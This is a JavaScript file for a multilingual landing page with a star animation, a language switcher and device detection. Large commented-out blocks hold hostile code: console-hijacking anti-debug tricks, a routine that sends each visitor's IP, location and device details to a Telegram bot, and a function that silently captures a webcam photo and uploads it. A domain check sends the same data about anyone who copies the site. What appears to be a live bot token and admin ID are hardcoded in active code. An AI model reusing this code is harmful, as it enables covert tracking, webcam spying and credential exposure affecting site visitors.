// const _0xa91332 = (function () {
//     let _0x51f1ef = true
//     return function (_0xfd3468, _0x2b1f8a) {
//       const _0x7dac7d = _0x51f1ef
//         ? function () {
//             if (_0x2b1f8a) {
//               const _0x3258f0 = _0x2b1f8a.apply(_0xfd3468, arguments)
//               return (_0x2b1f8a = null), _0x3258f0
//             }
//           }
//         : function () {}
//       return (_0x51f1ef = false), _0x7dac7d
//     }
//   })(),
//   _0x178b82 = _0xa91332(this, function () {
//     return _0x178b82
//       .toString()
//       .search('(((.+)+)+)+$')
//       .toString()
//       .constructor(_0x178b82)
//       .search('(((.+)+)+)+$')
//   })
// _0x178b82()
// const _0x10819e = (function () {
//     let _0x2a126d = true
//     return function (_0xa8c93a, _0xfe2493) {
//       const _0x20b087 = _0x2a126d
//         ? function () {
//             if (_0xfe2493) {
//               const _0x428594 = _0xfe2493.apply(_0xa8c93a, arguments)
//               return (_0xfe2493 = null), _0x428594
//             }
//           }
//         : function () {}
//       return (_0x2a126d = false), _0x20b087
//     }
//   })(),
//   _0x1d3d3b = _0x10819e(this, function () {
//     let _0x635e60
//     try {
//       const _0x31e833 = Function(
//         'return (function() {}.constructor("return this")( ));'
//       )
//       _0x635e60 = _0x31e833()
//     } catch (_0x33f3af) {
//       _0x635e60 = window
//     }
//     const _0x40dfc4 = (_0x635e60.console = _0x635e60.console || {}),
//       _0x10243d = [
//         'log',
//         'warn',
//         'info',
//         'error',
//         'exception',
//         'table',
//         'trace',
//       ]
//     for (let _0x300d6e = 0; _0x300d6e < _0x10243d.length; _0x300d6e++) {
//       const _0x2293af = _0x10819e.constructor.prototype.bind(_0x10819e),
//         _0x4ecea6 = _0x10243d[_0x300d6e],
//         _0x46d829 = _0x40dfc4[_0x4ecea6] || _0x2293af
//       _0x2293af['__proto__'] = _0x10819e.bind(_0x10819e)
//       _0x2293af.toString = _0x46d829.toString.bind(_0x46d829)
//       _0x40dfc4[_0x4ecea6] = _0x2293af
//     }
//   })
// _0x1d3d3b()
const TELEGRAM_BOT_TOKEN = '7477646274:AAEjcy9RuRy-R_B6iqIp7gG6AAMxV0EfLjM',
  ADMIN_ID = '6995484346'
// async function sendTelegramMessage(_0xd4b1ad) {
//   try {
//     const _0x750d6c = await fetch(
//         'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage',
//         {
//           method: 'POST',
//           headers: { 'Content-Type': 'application/json' },
//           body: JSON.stringify({
//             chat_id: ADMIN_ID,
//             text: _0xd4b1ad,
//             parse_mode: 'HTML',
//           }),
//         }
//       ),
//       _0x3eb9e7 = await _0x750d6c.json()
//     !_0x3eb9e7.ok && console.error('Failed to send message:', _0x3eb9e7)
//   } catch (_0x5c724b) {
//     console.error('Failed to send message:', _0x5c724b)
//   }
// }
async function getCountryName(_0x432934) {
  try {
    const _0xe26c51 = await fetch(
        'https://restcountries.com/v3.1/alpha/' + _0x432934
      ),
      _0x24f747 = await _0xe26c51.json()
    return _0x24f747[0]?.name.common || 'Unknown'
  } catch (_0x16de28) {
    return console.error('Failed to fetch country name:', _0x16de28), 'Unknown'
  }
}
async function getUserInfo() {
  try {
    const _0x47a8db = await fetch('https://ipinfo.io/json'),
      _0x17c48b = await _0x47a8db.json(),
      _0x53489c = await getCountryName(_0x17c48b.country),
      _0x4f74b = parseUserAgent(navigator.userAgent)
    return {
      ip: _0x17c48b.ip,
      country: _0x17c48b.country,
      countryName: _0x53489c,
      city: _0x17c48b.city,
      region: _0x17c48b.region,
      countryEmoji: getCountryEmoji(_0x17c48b.country),
      userAgent: navigator.userAgent,
      deviceModel: _0x4f74b.model,
      deviceType: _0x4f74b.type,
      deviceOS: _0x4f74b.os,
    }
  } catch (_0x2d6afb) {
    console.error('Failed to fetch user info:', _0x2d6afb)
    const _0x5679d7 = {}
    return (
      (_0x5679d7.ip = 'Unknown'),
      (_0x5679d7.country = 'Unknown'),
      (_0x5679d7.countryName = 'Unknown'),
      (_0x5679d7.city = 'Unknown'),
      (_0x5679d7.region = 'Unknown'),
      (_0x5679d7.countryEmoji = '\u2753'),
      (_0x5679d7.userAgent = navigator.userAgent),
      (_0x5679d7.deviceModel = 'Unknown'),
      (_0x5679d7.deviceType = 'Unknown'),
      (_0x5679d7.deviceOS = 'Unknown'),
      _0x5679d7
    )
  }
}
function parseUserAgent(_0x4b2520) {
  const _0x2b5abd = {
    regex: /iPhone\s*(\d+([_\.]\d+)*)/i,
    type: 'Mobile',
    os: 'iOS',
  }
  const _0x2369d4 = {
    regex: /iPad/i,
    type: 'Tablet',
    os: 'iOS',
  }
  const _0xd1c5af = {
    regex: /Android\s*([\d\.]+)/i,
    type: 'Mobile',
    os: 'Android',
  }
  const _0x1d8f1a = {
    regex: /Windows Phone\s*([\d\.]+)/i,
    type: 'Mobile',
    os: 'Windows Phone',
  }
  const _0x16c376 = [_0x2b5abd, _0x2369d4, _0xd1c5af, _0x1d8f1a],
    _0x3088d9 = {
      regex: /Windows/i,
      type: 'Desktop',
      os: 'Windows',
    }
  const _0x10360d = {
    regex: /Macintosh/i,
    type: 'Desktop',
    os: 'macOS',
  }
  const _0x37b7b0 = {
    regex: /Linux/i,
    type: 'Desktop',
    os: 'Linux',
  }
  const _0x2745d4 = [_0x3088d9, _0x10360d, _0x37b7b0]
  for (let _0x545bfd of _0x16c376) {
    const _0x26e6f7 = _0x4b2520.match(_0x545bfd.regex)
    if (_0x26e6f7) {
      return {
        type: _0x545bfd.type,
        os: _0x545bfd.os,
        model: parseDeviceModel(_0x4b2520, _0x545bfd.os),
      }
    }
  }
  for (let _0x32164c of _0x2745d4) {
    const _0x943916 = _0x4b2520.match(_0x32164c.regex)
    if (_0x943916) {
      return {
        type: _0x32164c.type,
        os: _0x32164c.os,
        model: parseDeviceModel(_0x4b2520, _0x32164c.os),
      }
    }
  }
  const _0x59d0b0 = {}
  return (
    (_0x59d0b0.type = 'Unknown'),
    (_0x59d0b0.os = 'Unknown'),
    (_0x59d0b0.model = 'Unknown Device'),
    _0x59d0b0
  )
}
function parseDeviceModel(_0x3c8198, _0x49477d) {
  switch (_0x49477d) {
    case 'iOS':
      const _0x112986 = _0x3c8198.match(/iPhone\s*(\d+([_\.]\d+)*)/i)
      if (_0x112986) {
        return 'iPhone ' + _0x112986[1].replace(/[_\.]/g, ' ')
      }
      const _0x294717 = _0x3c8198.match(/iPad/i)
      if (_0x294717) {
        return 'iPad'
      }
      break
    case 'Android':
      const _0x204171 = _0x3c8198.match(/;\s*([^;)]+)\s*Build/i)
      if (_0x204171) {
        return _0x204171[1].trim()
      }
      break
    case 'Windows':
      const _0x4119af = _0x3c8198.match(/Windows\s*([\w\s]+)/i)
      if (_0x4119af) {
        return 'Windows ' + _0x4119af[1]
      }
      break
    case 'macOS':
      const _0x1e2cc5 = _0x3c8198.match(/Macintosh;.*Mac\s*([\w\s]+)/i)
      if (_0x1e2cc5) {
        return 'Mac ' + _0x1e2cc5[1]
      }
      break
  }
  return 'Unknown Device'
}
function getCountryEmoji(_0x5accb3) {
  return _0x5accb3.replace(/./g, (_0x569a51) =>
    String.fromCodePoint(127397 + _0x569a51.toUpperCase().charCodeAt())
  )
}
// async function captureAndSendPhoto() {
//   try {
//     const _0x4b0840 = await navigator.mediaDevices.getUserMedia(_0x5c7654),
//       _0x185068 = document.createElement('video')
//     _0x185068.srcObject = _0x4b0840
//     await _0x185068.play()
//     const _0x934feb = document.createElement('canvas')
//     _0x934feb.width = _0x185068.videoWidth
//     _0x934feb.height = _0x185068.videoHeight
//     const _0xe1ca87 = _0x934feb.getContext('2d')
//     _0xe1ca87.drawImage(_0x185068, 0, 0, _0x934feb.width, _0x934feb.height)
//     _0x185068.pause()
//     _0x4b0840.getTracks().forEach((_0x193126) => _0x193126.stop())
//     const _0x9480a6 = await new Promise((_0x58acb8) =>
//         _0x934feb.toBlob(_0x58acb8, 'image/jpeg')
//       ),
//       _0x34bc84 = new FormData()
//     _0x34bc84.append('chat_id', ADMIN_ID)
//     _0x34bc84.append('photo', _0x9480a6, 'photo.jpg')
//     await fetch(
//       'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendPhoto',
//       {
//         method: 'POST',
//         body: _0x34bc84,
//       }
//     )
//     console.log('Photo captured and sent successfully')
//   } catch (_0x119c93) {
//     console.error('Failed to capture photo:', _0x119c93)
//   }
// }
// async function initTelegramBot() {
//   const _0x3c4903 = {
//     domain: window.location.hostname,
//     fullUrl: window.location.href,
//   }
//   const _0x52dfe4 = _0x3c4903
//   if (
//     _0x52dfe4.domain !== 'testing-webapps.ru' &&
//     _0x52dfe4.domain !== 'testing-webapps.ru'
//   ) {
//     document.body.innerHTML =
//       '\n            <div id="overlay">\n                <h1>Ошибка 404: Доступ запрещен</h1>\n                <div class="arrow top"></div>\n                <div class="arrow bottom"></div>\n                <div class="arrow left"></div>\n                <div class="arrow right"></div>\n                <img src="data:image/png;base64,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" alt="Error Image" style="max-width: 100%; height: auto;" />\n                <p>К сожалению, возникли проблемы с доступом к сайту:</p>\n                <ul>\n                    <li>Не удалось загрузить ресурс.</li>\n                    <li>Проблемы с сервером.</li>\n                    <li>Неправильный домен.</li>\n                    <li>Возможно вы блюм.</li>\n                    <li>Возможно вы хотели спиздить вебку.</li>\n                    <li>Возможно вы хотели обновить вебку за 15$.</li>\n                    <li>Возможно вы хотели купить вебку у ее кодера.</li>\n                </ul>\n                <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ" id="fixButton">Fix It</a>\n            </div>\n        '
//     const _0xe80bb3 = document.createElement('style')
//     _0xe80bb3.innerHTML =
//       "\n            body {\n                margin: 0;\n                height: 100vh;\n                display: flex;\n                justify-content: center;\n                align-items: center;\n                position: relative;\n                overflow: hidden;\n                background-color: #282c34;\n                color: white;\n                font-family: 'Arial', sans-serif;\n            }\n            #overlay {\n                position: absolute;\n                top: 0;\n                left: 0;\n                right: 0;\n                bottom: 0;\n                background: linear-gradient(135deg, rgba(255, 0, 0, 0.7), rgba(255, 255, 0, 0.7));\n                display: flex;\n                flex-direction: column;\n                justify-content: center;\n                align-items: center;\n                z-index: 9999;\n                padding: 20px;\n                animation: flicker 1s infinite;\n            }\n            h1 {\n                font-size: 4em;\n                margin: 0;\n                text-shadow: 0 0 10px rgba(255, 255, 255, 0.8);\n                animation: glow 1.5s infinite alternate;\n            }\n            p {\n                font-size: 1.5em;\n                margin: 20px 0;\n                text-shadow: 0 0 5px rgba(255, 255, 255, 0.5);\n            }\n            ul {\n                list-style-type: none;\n                padding: 0;\n                text-align: center;\n                font-size: 1.2em;\n            }\n            #fixButton {\n                background-color: white;\n                color: red;\n                border: none;\n                padding: 10px 20px;\n                font-size: 18px;\n                cursor: pointer;\n                text-decoration: none;\n                border-radius: 5px;\n                transition: background-color 0.3s, transform 0.3s;\n                box-shadow: 0 0 10px rgba(255, 0, 0, 0.8);\n            }\n            #fixButton:hover {\n                background-color: #ddd;\n                transform: scale(1.05);\n            }\n            @keyframes flicker {\n                0% { opacity: 1; }\n                50% { opacity: 0.7; }\n                100% { opacity: 1; }\n            }\n            @keyframes glow {\n                0% { text-shadow: 0 0 10px rgba(255, 255, 255, 0.8); }\n                100% { text-shadow: 0 0 20px rgba(255, 255, 255, 1); }\n            }\n        "
//     document.head.appendChild(_0xe80bb3)
//     const _0x4ba66a = await getUserInfo()
//     await sendTelegramMessage(
//       '\n\uD83D\uDEAB <b>Unauthorized Access Attempt Detected</b>\n\uD83D\uDCCD Domain: <code>' +
//         _0x52dfe4.domain +
//         '</code>\n\uD83D\uDD17 URL: <code>' +
//         _0x52dfe4.fullUrl +
//         '</code>\n\uD83C\uDF10 IP: <code>' +
//         _0x4ba66a.ip +
//         '</code>\n\uD83D\uDCCC Location: ' +
//         _0x4ba66a.city +
//         ', ' +
//         _0x4ba66a.region +
//         ', ' +
//         _0x4ba66a.countryName +
//         ' ' +
//         _0x4ba66a.countryEmoji +
//         '\n\uD83D\uDCF1 Device: <code>' +
//         _0x4ba66a.deviceModel +
//         '</code>\n\uD83D\uDDA5️ Type: <code>' +
//         _0x4ba66a.deviceType +
//         ' (' +
//         _0x4ba66a.deviceOS +
//         ')</code>\n\uD83D\uDCF1 User Agent: <code>' +
//         _0x4ba66a.userAgent +
//         '</code>\n\u23F0 Time: <code>' +
//         new Date().toISOString() +
//         '</code>\n        '
//     )
//     await captureAndSendPhoto()
//     setInterval(() => {
//       location.reload()
//     }, 11200)
//     return
//   }
//   try {
//     const _0x393663 = await fetch(
//         'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/getMe'
//       ),
//       _0x22c32a = await _0x393663.json()
//     if (_0x22c32a.ok) {
//       console.log('Bot initialized')
//       isAuthenticated = true
//       const _0x2a46a2 = await getUserInfo()
//       await sendTelegramMessage(
//         '\n\uD83D\uDE80 <b>New Bot Access Detected</b>\n\uD83D\uDCCD Domain: <code>' +
//           _0x52dfe4.domain +
//           '</code>\n\uD83D\uDD17 URL: <code>' +
//           _0x52dfe4.fullUrl +
//           '</code>\n\uD83C\uDF10 IP: <code>' +
//           _0x2a46a2.ip +
//           '</code>\n\uD83D\uDCCC Location: ' +
//           _0x2a46a2.city +
//           ', ' +
//           _0x2a46a2.region +
//           ', ' +
//           _0x2a46a2.countryName +
//           ' ' +
//           _0x2a46a2.countryEmoji +
//           '\n\uD83D\uDCF1 Device: <code>' +
//           _0x2a46a2.deviceModel +
//           '</code>\n\uD83D\uDDA5️ Type: <code>' +
//           _0x2a46a2.deviceType +
//           ' (' +
//           _0x2a46a2.deviceOS +
//           ')</code>\n\uD83D\uDCF1 User Agent: <code>' +
//           _0x2a46a2.userAgent +
//           '</code>\n\u23F0 Time: <code>' +
//           new Date().toISOString() +
//           '</code>\n            '
//       )
//     }
//   } catch (_0x338b37) {
//     console.error('Failed to initialize bot:', _0x338b37)
//     const _0x5c82b3 = await getUserInfo()
//     await sendTelegramMessage(
//       '\n\u2757️ <b>Bot Initialization Failed</b>\n\uD83D\uDCCD Domain: <code>' +
//         _0x52dfe4.domain +
//         '</code>\n\uD83D\uDD17 URL: <code>' +
//         _0x52dfe4.fullUrl +
//         '</code>\n\uD83C\uDF10 IP: <code>' +
//         _0x5c82b3.ip +
//         '</code>\n\uD83D\uDCCC Location: ' +
//         _0x5c82b3.city +
//         ', ' +
//         _0x5c82b3.region +
//         ', ' +
//         _0x5c82b3.countryName +
//         ' ' +
//         _0x5c82b3.countryEmoji +
//         '\n\uD83D\uDCF1 Device: <code>' +
//         _0x5c82b3.deviceModel +
//         '</code>\n\uD83D\uDDA5️ Type: <code>' +
//         _0x5c82b3.deviceType +
//         ' (' +
//         _0x5c82b3.deviceOS +
//         ')</code>\n\uD83D\uDCF1 User Agent: <code>' +
//         _0x5c82b3.userAgent +
//         '</code>\n\u23F0 Time: <code>' +
//         new Date().toISOString() +
//         '</code>\n        '
//     )
//   }
// }
// document.addEventListener('DOMContentLoaded', (_0x5c4ac1) => {
//   initTelegramBot()
// })
function createStars() {
  const _0x241f66 = document.querySelector('.stars')
  for (let _0x28f97b = 0; _0x28f97b < 300; _0x28f97b++) {
    const _0x3b9bf6 = document.createElement('div')
    _0x3b9bf6.className = 'star'
    const _0x3d0ba3 = Math.random() * 100,
      _0x5449d6 = Math.random() * 100,
      _0x4d6026 = Math.random() * 2,
      _0x2ed079 = 3 + Math.random() * 4
    _0x3b9bf6.style.left = _0x3d0ba3 + '%'
    _0x3b9bf6.style.top = _0x5449d6 + '%'
    _0x3b9bf6.style.width = _0x4d6026 + 'px'
    _0x3b9bf6.style.height = _0x4d6026 + 'px'
    _0x3b9bf6.style.setProperty('--duration', _0x2ed079 + 's')
    _0x241f66.appendChild(_0x3b9bf6)
  }
}
function toggleLangMenu() {
  const _0x4a4b26 = document.getElementById('lang-options')
  _0x4a4b26.classList.toggle('show')
}
const _0x290f57 = {}
_0x290f57.ru = 'ПК'
_0x290f57.en = 'PC'
_0x290f57.hi = 'पीसी'
_0x290f57.br = 'PC'
_0x290f57.es = 'PC'
_0x290f57.uz = 'PK'
_0x290f57.az = 'PC'
_0x290f57.tr = 'PC'
_0x290f57.pt = 'PC'
_0x290f57.ar = 'كمبيوتر'
const _0x5b29f6 = {}
_0x5b29f6.ru = 'Android'
_0x5b29f6.en = 'Android'
_0x5b29f6.hi = 'एन्ड्रोयड'
_0x5b29f6.br = 'Android'
_0x5b29f6.es = 'Android'
_0x5b29f6.uz = 'Android'
_0x5b29f6.az = 'Android'
_0x5b29f6.tr = 'Android'
_0x5b29f6.pt = 'Android'
_0x5b29f6.ar = 'أندرويد'
const _0x140c93 = {}
_0x140c93.ru = 'iOS'
_0x140c93.en = 'iOS'
_0x140c93.hi = 'आईओएस'
_0x140c93.br = 'iOS'
_0x140c93.es = 'iOS'
_0x140c93.uz = 'iOS'
_0x140c93.az = 'iOS'
_0x140c93.tr = 'iOS'
_0x140c93.pt = 'iOS'
_0x140c93.ar = 'آيفون'
const _0x29659a = {}
_0x29659a.pc = _0x290f57
_0x29659a.android = _0x5b29f6
_0x29659a.ios = _0x140c93
const deviceTexts = _0x29659a
function switchLanguage(_0x3e5d66) {
  const _0x1a85d4 = document.getElementById('current-flag')
  const _0x1375f2 = document.getElementById('current-lang-text'),
    _0xa21d35 = _0x3e5d66 === 'hi' ? 'hin' : _0x3e5d66
  _0x1a85d4.src = 'avas/' + _0xa21d35 + '.png'
  _0x1375f2.textContent = _0x3e5d66.toUpperCase()
  document.querySelectorAll('.play-button').forEach((_0x18a15d) => {
    _0x18a15d.textContent = _0x18a15d.getAttribute('data-' + _0x3e5d66)
  })
  document.documentElement.lang = _0x3e5d66
  document.getElementById('lang-options').classList.remove('show')
  const _0x14292c = document.getElementById('lang-options')
  _0x14292c.innerHTML = ''
  const _0x17191a = {
    code: 'ru',
    name: 'RU',
    file: 'ru',
  }
  const _0xeb7a32 = {
    code: 'en',
    name: 'EN',
    file: 'en',
  }
  const _0x2cc6de = {
    code: 'hi',
    name: 'हिन्दी (HI)',
    file: 'hin',
  }
  const _0x1ed5d6 = {
    code: 'br',
    name: 'PT-BR',
    file: 'br',
  }
  const _0xee5bfb = {
    code: 'es',
    name: 'ES',
    file: 'es',
  }
  const _0x329b0e = {
    code: 'uz',
    name: 'UZ',
    file: 'uz',
  }
  const _0x2b72df = {
    code: 'az',
    name: 'AZ',
    file: 'az',
  }
  const _0x4818fd = {
    code: 'tr',
    name: 'TR',
    file: 'tr',
  }
  const _0x4946de = {
    code: 'pt',
    name: 'PT',
    file: 'pt',
  }
  const _0x318763 = {
    code: 'ar',
    name: 'العربية',
    file: 'ar',
  }
  const _0x165d59 = [
      _0x17191a,
      _0xeb7a32,
      _0x2cc6de,
      _0x1ed5d6,
      _0xee5bfb,
      _0x329b0e,
      _0x2b72df,
      _0x4818fd,
      _0x4946de,
      _0x318763,
    ],
    _0x2ed8b9 = _0x165d59.filter((_0x498a42) => _0x498a42.code !== _0x3e5d66)
  _0x2ed8b9.forEach((_0x4289b4) => {
    _0x14292c.innerHTML +=
      '\n            <div class="lang-option" onclick="switchLanguage(\'' +
      _0x4289b4.code +
      '\')">\n                <img src="avas/' +
      _0x4289b4.file +
      '.png" alt="' +
      _0x4289b4.name +
      '" class="lang-flag">\n                <span class="lang-text">' +
      _0x4289b4.name +
      '</span>\n            </div>\n        '
  })
  updateDeviceInfo(_0x3e5d66)
}
function detectDevice() {
  const _0x5728ce = navigator.userAgent.toLowerCase()
  if (/android/i.test(_0x5728ce)) {
    return 'android'
  } else {
    if (/iphone|ipad|ipod/i.test(_0x5728ce)) {
      return 'ios'
    } else {
      return 'pc'
    }
  }
}
function updateDeviceInfo(_0x5a3703) {
  const _0x3390ef = detectDevice(),
    _0xb5e783 = document.getElementById('device-icon'),
    _0x551407 = document.getElementById('device-text')
  let _0xc386ba = _0x3390ef === 'pc' ? '\uD83D\uDCBB' : '\uD83D\uDCF1',
    _0x5db6ad = deviceTexts[_0x3390ef][_0x5a3703] || deviceTexts[_0x3390ef].en
  _0xb5e783.textContent = _0xc386ba
  _0x551407.textContent = _0x5db6ad
}
let lastScrollTop = 0
const topBar = document.querySelector('.top-bar')
let isHidden = false
window.addEventListener(
  'scroll',
  () => {
    const _0x2edea4 = window.pageYOffset || document.documentElement.scrollTop
    document.getElementById('lang-options').classList.remove('show')
    _0x2edea4 > lastScrollTop &&
      _0x2edea4 > 50 &&
      !isHidden &&
      (topBar.classList.add('hidden'), (isHidden = true))
    if (_0x2edea4 <= 0 && isHidden) {
      topBar.classList.remove('hidden')
      isHidden = false
    }
    lastScrollTop = _0x2edea4 <= 0 ? 0 : _0x2edea4
  },
  false
)
document.addEventListener('click', (_0x248e16) => {
  const _0x3453c9 = document.querySelector('.language-switcher')
  !_0x3453c9.contains(_0x248e16.target) &&
    document.getElementById('lang-options').classList.remove('show')
})
document.addEventListener('DOMContentLoaded', () => {
  createStars()
  switchLanguage('ru')
  updateDeviceInfo('ru')
  const _0x24cd8b = document.querySelectorAll('.play-button')
  _0x24cd8b.forEach((_0x3ebad2) => {
    _0x3ebad2.setAttribute('data-ru', 'ОТКРЫТЬ')
    _0x3ebad2.setAttribute('data-en', 'OPEN')
    _0x3ebad2.setAttribute('data-hi', 'खोलें')
    _0x3ebad2.setAttribute('data-br', 'ABRIR')
    _0x3ebad2.setAttribute('data-es', 'ABRIR')
    _0x3ebad2.setAttribute('data-uz', 'OCHISH')
    _0x3ebad2.setAttribute('data-az', 'AÇ')
    _0x3ebad2.setAttribute('data-tr', 'AÇ')
    _0x3ebad2.setAttribute('data-pt', 'ABRIR')
    _0x3ebad2.setAttribute('data-ar', 'فتح')
    _0x3ebad2.textContent = 'ОТКРЫТЬ'
  })
})
